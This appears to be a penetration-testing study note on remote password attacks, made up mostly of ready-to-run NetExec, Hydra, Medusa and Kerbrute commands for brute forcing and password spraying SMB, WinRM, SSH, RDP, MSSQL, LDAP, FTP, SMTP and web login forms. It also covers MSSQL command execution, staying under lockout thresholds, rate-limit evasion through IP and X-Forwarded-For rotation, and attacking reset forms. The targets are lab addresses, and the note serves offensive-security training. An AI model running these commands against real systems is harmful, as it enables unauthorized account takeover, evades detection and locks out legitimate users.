title: Remote Password Attacks
---

Throwing credentials at network services from the outside. Pair with the custom wordlist methodology from [[08. Cracking Hashes|Cracking Hashes]] and the username enumeration in [[02. Credentials in the Network|Credentials in the Network]].

Two modes:
- **Brute force** — many passwords per account (loud, triggers lockout)
- **Password spray** — one password across many accounts (quieter, usually avoids lockout)

Spray by default. Brute force only when you know lockout is disabled or you're OK with the noise.

## NetExec — The Universal Hammer

Fast, protocol-aware, parallelized. Replaces most Hydra/Medusa usage.

```bash
# SMB
netexec smb 10.10.10.10 -u users.txt -p 'Winter2025!' -d <domain> --continue-on-success
netexec smb 10.10.10.0/24 -u bob -p passwords.txt --local-auth
netexec smb 10.10.10.10 -u bob -H <NThash>

# WinRM
netexec winrm 10.10.10.10 -u users.txt -p 'Winter2025!'

# SSH
netexec ssh 10.10.10.0/24 -u root -p passwords.txt

# RDP (requires xfreerdp3)
netexec rdp 10.10.10.10 -u Administrator -p passwords.txt

# MSSQL
netexec mssql 10.10.10.10 -u sa -p passwords.txt
netexec mssql 10.10.10.10 -u sa -p 'Pass!' -x 'whoami'

# LDAP (great against DCs)
netexec ldap 10.10.10.10 -u users.txt -p 'Winter2025!'

# FTP / VNC — modules
netexec ftp 10.10.10.10 -u anonymous -p ''
```

Output markers:

| Marker | Meaning |
|---|---|
| `[+]` | Valid auth |
| `Pwn3d!` | You have admin on this host |
| `[-]` | Auth failed |
| `STATUS_PASSWORD_MUST_CHANGE` | Valid pair, password expired — use a different protocol or trigger reset |
| `STATUS_LOGON_FAILURE` | Normal failed attempt |
| `STATUS_ACCOUNT_LOCKED_OUT` | **Stop sprayign immediately** |

Always add `--continue-on-success` when password-spraying so NetExec doesn't stop at the first hit.

## Hydra — Per-Protocol Brute Force

Still useful when NetExec doesn't support a protocol (HTTP forms, Telnet, SMTP AUTH, IMAP, POP3, VNC with custom options).

```bash
# SSH
hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -t 4

# FTP
hydra -l admin -P rockyou.txt ftp://10.10.10.10

# RDP
hydra -L users.txt -P passwords.txt rdp://10.10.10.10

# MSSQL
hydra -l sa -P passwords.txt mssql://10.10.10.10

# HTTP Basic auth
hydra -l admin -P rockyou.txt 10.10.10.10 http-get /admin/

# HTTP form (POST)
hydra -L users.txt -P passwords.txt 10.10.10.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid"

# SMTP AUTH
hydra -L users.txt -P passwords.txt smtp://mail.target.com -S -s 465

# Resume
hydra -R
```

`-t` controls threads (default 16, drop to 4 for SSH to avoid "too many auth failures"). `-vV` for verbose per-attempt output.

## Medusa — Hydra Alternative

```bash
medusa -h 10.10.10.10 -U users.txt -P passwords.txt -M ssh -t 4
medusa -h 10.10.10.10 -u admin -P rockyou.txt -M ftp
medusa -H hosts.txt -u bob -P pw.txt -M smbnt    # SMB
```

Medusa parallelizes across hosts better; Hydra parallelizes across passwords better.

## Password Spraying

### SMB spray against AD

```bash
# One password, every user — safest first attempt
netexec smb 10.10.10.10 -u users.txt -p 'Welcome1' -d corp.local --continue-on-success

# Sweep a subnet
netexec smb 10.10.10.0/24 -u users.txt -p 'Welcome1' --continue-on-success
```

### Kerbrute passwordspray

Lower noise — queries KDC with pre-auth directly, doesn't always increment lockout counters depending on policy.

```bash
# Enumerate valid users (no lockout — PRINCIPAL UNKNOWN vs pre-auth error)
./kerbrute userenum --dc 10.10.10.10 -d inlanefreight.local names.txt

# Spray
./kerbrute passwordspray --dc 10.10.10.10 -d inlanefreight.local users.txt 'Winter2025!'

# Spray with multiple passwords (one at a time, wait between)
for p in Welcome1 Password1 Winter2025!; do
  ./kerbrute passwordspray --dc 10.10.10.10 -d inlanefreight.local users.txt "$p"
  sleep 1800
done
```

### Lockout policy — know before spraying

```bash
# Get domain lockout policy (any authenticated user)
netexec smb 10.10.10.10 -u bob -p 'Pass!' --pass-pol
# or
rpcclient -U 'bob%Pass!' 10.10.10.10 -c 'getdompwinfo'
```

Typical values:
- `Lockout threshold: 5` — fewer attempts before lockout
- `Lockout observation window: 00:30:00` — wait this long to reset counter
- `Lockout duration: 00:30:00` — if lockout triggers, user is locked this long

Rule of thumb: stay at ≤ `threshold - 2` attempts per observation window per user.

## Service-Specific Notes

### SMB / WinRM / RDP

- Signing required? SMB signing enforced = NTLM relay blocked but spraying still works.
- RDP often has NLA — spray takes slightly more time per attempt.

### SSH

- `MaxAuthTries` on sshd caps attempts per connection (default 6). Hydra opens new connections per try.
- Public key auth skips the password prompt — run `ssh-keyscan` first to confirm password auth is enabled.

### MSSQL

- Default `sa` account often has a weak password.
- `xp_cmdshell` can run OS commands once you're in — `netexec mssql ... -x 'whoami'`.

### FTP

- Anonymous auth: `-l anonymous -p anonymous@test.com` often works in surprising places.
- Clear-text — pcap + Pcredz if you can sniff the segment.

### Web Login Forms

- Burp Intruder is often friendlier than Hydra here (CSRF tokens, rate-limiting bypass with X-Forwarded-For rotation).
- See [[05. Using Web Proxies/|Using Web Proxies]] and [[06. Attacking Web Applications with Ffuf/|Ffuf]] for parameter fuzzing against auth endpoints.

## When Nothing Works

- **Rotate IPs** — many services rate-limit per source IP, not per account.
- **Hit a different protocol** — WinRM when SMB is locked, Kerberos when NTLM is hardened.
- **Reverse brute force** — fix the password (`Password1`), rotate the usernames.
- **Target the forgot-password / self-service reset form** instead of login.

## Avoid These Mistakes

- Don't spray without pulling lockout policy first.
- Don't brute force a production-critical account (DA, backup svc). Lockout = ticket.
- Don't trust old password dumps blindly — passwords from a 2020 leak work on <5% of accounts.
- Don't hit the wrong RID range — spraying `krbtgt` is useless (disabled account).
